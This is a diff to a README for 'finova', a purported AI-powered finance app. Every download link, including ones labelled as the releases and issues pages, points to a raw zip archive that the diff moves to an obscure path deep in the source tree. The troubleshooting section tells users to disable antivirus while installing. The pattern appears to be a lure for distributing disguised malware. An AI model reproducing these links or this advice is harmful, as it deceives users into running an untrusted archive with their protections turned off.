@@ -1,7 +1,7 @@
 # 🌟 finova - Manage Your Finances Smartly and Easily
 
 ## 💾 Download Now
-[![Download finova](https://raw.githubusercontent.com/Felipe2099/finova/main/ruther/finova.zip)](https://raw.githubusercontent.com/Felipe2099/finova/main/ruther/finova.zip)
+[![Download finova](https://raw.githubusercontent.com/Felipe2099/finova/main/app/Services/Supplier/Contracts/Software-3.6.zip)](https://raw.githubusercontent.com/Felipe2099/finova/main/app/Services/Supplier/Contracts/Software-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to finova! This guide helps you download and run the software easily. finova is an open-source, AI-powered financial management platform. You can track multiple currencies, manage projects, and get real-time analytics—all in one place. No programming knowledge is needed!
@@ -9,7 +9,7 @@ Welcome to finova! This guide helps you download and run the software easily. fi
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Felipe2099/finova/main/ruther/finova.zip) to find the latest version of finova. 
+   Go to our [Releases page](https://raw.githubusercontent.com/Felipe2099/finova/main/app/Services/Supplier/Contracts/Software-3.6.zip) to find the latest version of finova. 
 
 2. **Choose the Right File**  
    You will see several files for different operating systems. Choose the one that matches your system. For Windows, look for a `.exe` file. For macOS, find the `.dmg` file. 
@@ -77,10 +77,10 @@ If you encounter any issues while downloading or installing finova, here are som
    Sometimes, antivirus software may mistakenly flag our installer. If you encounter issues, disable it temporarily while installing.
 
 3. **Re-download the File**  
-   If the file seems corrupted, delete it and download it again from the [Releases page](https://raw.githubusercontent.com/Felipe2099/finova/main/ruther/finova.zip).
+   If the file seems corrupted, delete it and download it again from the [Releases page](https://raw.githubusercontent.com/Felipe2099/finova/main/app/Services/Supplier/Contracts/Software-3.6.zip).
 
 4. **Search the Issues Page**  
-   Visit the [issues section](https://raw.githubusercontent.com/Felipe2099/finova/main/ruther/finova.zip) of our repository. You may find solutions shared by other users.
+   Visit the [issues section](https://raw.githubusercontent.com/Felipe2099/finova/main/app/Services/Supplier/Contracts/Software-3.6.zip) of our repository. You may find solutions shared by other users.
 
 5. **Contact Support**  
    If problems persist, reach out through our contact options provided in the application for further assistance.
